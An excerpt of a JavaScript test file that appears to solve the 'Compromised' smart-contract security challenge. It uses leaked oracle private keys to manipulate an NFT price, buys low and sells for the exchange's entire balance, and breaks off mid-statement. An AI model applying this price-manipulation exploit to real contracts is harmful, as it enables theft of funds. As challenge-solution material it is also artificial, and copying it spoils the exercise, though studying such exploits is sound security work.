...
describe("Compromised challenge", function () {
  ...
  it("Exploit", async function () {
    ...
    function leakToPrivateKey(leak) {
    ...
    const walletsCorespondingToPrivateKeys = privateKeys.map((privateKey) => {
    ...
    for (wallet of walletsCorespondingToPrivateKeys) {
      await this.oracle.connect(wallet).postPrice(tokenSymbol, 0);
    }

    // Buy the NFT sending 1 wei
    await this.exchange.connect(attacker).buyOne({ value: 1 });

    const balanceOfExchange = ethers.BigNumber.from(
      await ethers.provider.getBalance(this.exchange.address)
    );

    // Change the price of the NFT to the balnce of the exchange contract
    for (wallet of walletsCorespondingToPrivateKeys) {
      await this.oracle
        .connect(wallet)
        .postPrice(tokenSymbol, balanceOfExchange);
    }

    // Approve NFT to exchange contract and sell it
    await this.nftToken.connect(attacker).approve(this.exchange.address, 0);
    await this.exchange.connect(attacker).sellOne(0);

    // Change the price of NFT to the first one
    for (wallet of walletsCorespondingToPrivateKeys) {
      await this.oracle
        .connect(wallet)
